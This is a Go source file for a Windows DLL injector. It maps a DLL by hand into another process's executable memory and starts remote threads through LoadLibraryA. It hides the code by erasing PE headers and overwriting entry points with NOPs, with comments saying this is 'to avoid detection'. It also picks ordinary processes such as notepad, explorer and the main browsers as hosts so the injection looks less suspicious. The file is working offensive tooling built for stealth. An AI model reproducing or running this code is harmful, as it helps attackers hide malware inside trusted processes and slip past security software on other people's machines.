package injector

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ErasePEHeader erases PE header to avoid detection
func ErasePEHeader(processHandle windows.Handle, baseAddress uintptr) error {
	// Erase PE header, usually fill the first 4KB of PE header memory with zeros
	var bytesWritten uintptr
	zeroBuffer := make([]byte, 4096) // 4KB zero fill

	// Write zero fill to PE header
	err := WriteProcessMemory(processHandle, baseAddress, unsafe.Pointer(&zeroBuffer[0]), uintptr(len(zeroBuffer)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("Failed to erase PE header: %v", err)
	}

	return nil
}

// EraseEntryPoint erases entry point to avoid detection
func EraseEntryPoint(processHandle windows.Handle, baseAddress uintptr) error {
	// 读取PE头，找到入口点，然后用NOP指令覆盖入口点
	// 读取DOS头和NT头，获取入口点RVA
	var dosHeader [64]byte
	var bytesRead uintptr

	// 读取DOS头
	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read DOS header: %v", err)
	}

	// 获取PE头偏移
	peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))

	// 读取标准PE头
	var peHeader [24]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset), &peHeader[0], 24, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read PE header: %v", err)
	}

	// 读取可选PE头
	var optHeader [240]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset)+24, &optHeader[0], 240, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read optional PE header: %v", err)
	}

	// 获取入口点RVA (位于可选PE头的第16字节)
	entryPointRVA := *(*uint32)(unsafe.Pointer(&optHeader[16]))

	// 如果没有入口点，直接返回
	if entryPointRVA == 0 {
		return nil
	}

	// 计算入口点地址
	entryPointAddr := baseAddress + uintptr(entryPointRVA)

	// 创建NOP指令填充
	nopBuffer := make([]byte, 32) // 32字节的NOP指令
	for i := range nopBuffer {
		nopBuffer[i] = 0x90 // x86 NOP指令
	}

	// 写入NOP指令到入口点
	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, entryPointAddr, unsafe.Pointer(&nopBuffer[0]), uintptr(len(nopBuffer)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("Failed to erase entry point: %v", err)
	}

	return nil
}

// ManualMapDLL loads DLL using manual mapping method
func ManualMapDLL(hProcess windows.Handle, dllBytes []byte) (uintptr, error) {
	// 检查参数
	if hProcess == 0 {
		return 0, fmt.Errorf("Process handle cannot be zero")
	}

	if len(dllBytes) == 0 {
		return 0, fmt.Errorf("DLL data cannot be empty")
	}

	Printf("Starting manual mapping of DLL, DLL size: %d bytes\n", len(dllBytes))

	// 解析PE头
	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		return 0, fmt.Errorf("Failed to parse PE header: %v", err)
	}

	Printf("Successfully parsed PE header, image size: %d bytes\n", peHeader.OptionalHeader.SizeOfImage)

	// 计算需要分配的内存大小
	imageSize := peHeader.OptionalHeader.SizeOfImage

	// 分配内存基址
	var baseAddress uintptr

	// 分配内存 - 简化版本
	Printf("Allocating memory for DLL...\n")
	baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("Failed to allocate memory in target process: %v", err)
	}
	Printf("Successfully allocated memory at address 0x%X\n", baseAddress)

	/*
		if options.InvisibleMemory {
			// 尝试在高地址空间分配内存，如果失败则尝试让系统自动选择地址
			// 使用几个不同的高地址尝试
			Printf("Attempting to allocate invisible memory in high address space...\n")

			// 获取适合当前架构的高地址
			var highAddresses []uintptr
			if unsafe.Sizeof(uintptr(0)) == 8 {
				// 64位系统 - 使用运行时计算避免编译时常量溢出
				// 将计算分解为多个步骤，确保编译器无法在编译时预计算
				shift := uint(28)
				base1 := uint64(0x7FFF)
				base2 := uint64(0x7FFE)
				base3 := uint64(0x7FFD)

				highAddresses = []uintptr{
					uintptr(base1 << shift), // 0x7FFF0000000
					uintptr(base2 << shift), // 0x7FFE0000000
					uintptr(base3 << shift), // 0x7FFD0000000
					0x70000000,
				}
			} else {
				// 32位系统
				highAddresses = []uintptr{0x70000000, 0x60000000, 0x50000000, 0x40000000}
			}

			for _, addr := range highAddresses {
				Printf("Trying to allocate memory at address 0x%X...\n", addr)
				baseAddress, memAllocErr = VirtualAllocEx(hProcess, addr, uintptr(imageSize),
					windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
				if memAllocErr == nil {
					Printf("Successfully allocated memory at address 0x%X\n", baseAddress)
					break // 成功分配了内存
				}
				Printf("Failed to allocate at 0x%X: %v\n", addr, memAllocErr)
			}

			// 如果所有高地址都失败，尝试让系统自动选择
			if memAllocErr != nil {
				Printf("Failed to allocate memory in high address space, letting system choose address...\n")
				baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
					windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
				if err != nil {
					return 0, fmt.Errorf("Failed to allocate memory in target process: %v", err)
				}
				Printf("System selected address: 0x%X\n", baseAddress)
			}
		} else {
			// 正常分配内存，让系统自动选择地址
			Printf("Letting system choose memory address...\n")

			// 添加详细的调试信息
			Printf("Process handle: 0x%X\n", hProcess)
			Printf("Image size: %d bytes (0x%X)\n", imageSize, imageSize)

			// 验证imageSize是否合理
			if imageSize == 0 {
				return 0, fmt.Errorf("Invalid image size: %d", imageSize)
			}
			if imageSize > 0x10000000 { // 256MB限制
				return 0, fmt.Errorf("Image size too large: %d bytes", imageSize)
			}

			baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
				windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
			if err != nil {
				return 0, fmt.Errorf("Failed to allocate memory in target process (size: %d): %v", imageSize, err)
			}
			Printf("System allocated memory at address: 0x%X\n", baseAddress)
		}
	*/

	// 映射PE文件各节到远程进程内存
	Printf("Starting to map PE sections to remote process memory...\n")
	err = MapSections(hProcess, dllBytes, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to map PE sections: %v", err)
	}
	Printf("Successfully mapped PE sections\n")

	// 修复导入表
	Printf("Starting to fix import table...\n")
	err = FixImports(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to fix import table: %v", err)
	}
	Printf("Successfully fixed import table\n")

	// 修复重定位
	Printf("Starting to fix relocations...\n")
	err = FixRelocations(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to fix relocations: %v", err)
	}
	Printf("Successfully fixed relocations\n")

	// 执行DLL入口点
	Printf("Starting to execute DLL entry point...\n")
	err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to execute DLL entry point: %v", err)
	}
	Printf("Successfully executed DLL entry point\n")

	// 应用高级反检测技术已移除，因为需要options参数

	Printf("Manual mapping of DLL completed, base address: 0x%X\n", baseAddress)
	return baseAddress, nil
}

// FindLegitProcess 查找合法进程进行注入
func FindLegitProcess() (uint32, string, error) {
	// 常见的合法用户进程名称，避免选择系统进程
	legitimateProcesses := []string{
		"notepad.exe",
		"explorer.exe",
		"msedge.exe",
		"chrome.exe",
		"firefox.exe",
		"iexplore.exe",
		"calc.exe",
		"mspaint.exe",
	}

	// 获取系统进程列表
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to create process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var processEntry windows.ProcessEntry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))

	// 查找合法进程
	var targetPID uint32
	var targetName string

	err = windows.Process32First(snapshot, &processEntry)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to get first process: %v", err)
	}

	for {
		processName := windows.UTF16ToString(processEntry.ExeFile[:])
		for _, legitName := range legitimateProcesses {
			if processName == legitName {
				// 尝试打开进程检查是否有访问权限
				hProcess, err := windows.OpenProcess(
					windows.PROCESS_CREATE_THREAD|
						windows.PROCESS_VM_OPERATION|
						windows.PROCESS_VM_WRITE|
						windows.PROCESS_VM_READ|
						windows.PROCESS_QUERY_INFORMATION,
					false, processEntry.ProcessID)

				if err == nil {
					// 如果能成功打开进程，则选择该进程
					windows.CloseHandle(hProcess)
					targetPID = processEntry.ProcessID
					targetName = processName
					Printf("Found accessible legitimate process: %s (PID: %d)\n", targetName, targetPID)
					break
				}
				// 如果无法打开进程，继续查找下一个
			}
		}

		if targetPID != 0 {
			break
		}

		err = windows.Process32Next(snapshot, &processEntry)
		if err != nil {
			break
		}
	}

	if targetPID == 0 {
		// 如果找不到现有的合法进程，尝试启动一个新的记事本进程
		Println("Could not find accessible legitimate process, trying to start Notepad...")

		// 创建记事本进程
		si := windows.StartupInfo{}
		pi := windows.ProcessInformation{}

		si.Cb = uint32(unsafe.Sizeof(si))

		// 构建命令行
		cmdLine, _ := windows.UTF16PtrFromString("notepad.exe")

		err := windows.CreateProcess(
			nil,
			cmdLine,
			nil,
			nil,
			false,
			windows.CREATE_NEW_CONSOLE,
			nil,
			nil,
			&si,
			&pi)

		if err != nil {
			return 0, "", fmt.Errorf("Failed to start Notepad process: %v", err)
		}

		// 关闭不需要的句柄
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)

		targetPID = pi.ProcessId
		targetName = "notepad.exe"
		Printf("Started new Notepad process: PID %d\n", targetPID)
	}

	if targetPID == 0 {
		return 0, "", fmt.Errorf("Could not find or create a legitimate process for injection")
	}

	return targetPID, targetName, nil
}

// LegitimateProcessInjection performs injection through a legitimate process
func LegitimateProcessInjection(hProcess windows.Handle, dllBytes []byte) error {
	Printf("Starting legitimate process injection\n")

	// Find a legitimate process to use as intermediary
	legitPID, legitName, err := FindLegitProcess()
	if err != nil {
		return fmt.Errorf("failed to find legitimate process: %v", err)
	}

	Printf("Using legitimate process: %s (PID: %d)\n", legitName, legitPID)

	// Open legitimate process
	legitHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, legitPID)
	if err != nil {
		return fmt.Errorf("failed to open legitimate process: %v", err)
	}
	defer windows.CloseHandle(legitHandle)

	// First inject into legitimate process using standard method
	// Create temporary DLL file
	tempFile, err := createTempDllFile(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to create temp DLL file: %v", err)
	}
	defer os.Remove(tempFile)

	// Allocate memory in legitimate process for DLL path
	dllPathBytes := []byte(tempFile + "\x00")
	pathSize := len(dllPathBytes)

	memAddr, err := VirtualAllocEx(legitHandle, 0, uintptr(pathSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory in legitimate process: %v", err)
	}

	// Write DLL path to legitimate process
	var bytesWritten uintptr
	err = WriteProcessMemory(legitHandle, memAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(pathSize), &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to write DLL path to legitimate process: %v", err)
	}

	// Get LoadLibraryA address
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	// Create remote thread in legitimate process
	var threadID uint32
	threadHandle, err := CreateRemoteThread(legitHandle, nil, 0,
		loadLibraryAddr, memAddr, 0, &threadID)
	if err != nil {
		return fmt.Errorf("failed to create remote thread in legitimate process: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	// Wait for injection to complete
	waitResult, err := windows.WaitForSingleObject(threadHandle, 5000)
	if err != nil {
		return fmt.Errorf("failed to wait for legitimate process injection: %v", err)
	}

	if waitResult == uint32(windows.WAIT_TIMEOUT) {
		return fmt.Errorf("legitimate process injection timed out")
	}

	Printf("Successfully injected DLL into legitimate process\n")

	// Now the DLL should be running in the legitimate process
	// and can be used to inject into the target process through
	// less suspicious means

	return nil
}

// Helper function to create temp DLL file
func createTempDllFile(dllBytes []byte) (string, error) {
	tempDir := os.TempDir()
	fileName := fmt.Sprintf("temp_dll_%d.dll", time.Now().UnixNano())
	tempFile := filepath.Join(tempDir, fileName)

	err := ioutil.WriteFile(tempFile, dllBytes, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to create temporary DLL file: %v", err)
	}

	return tempFile, nil
}
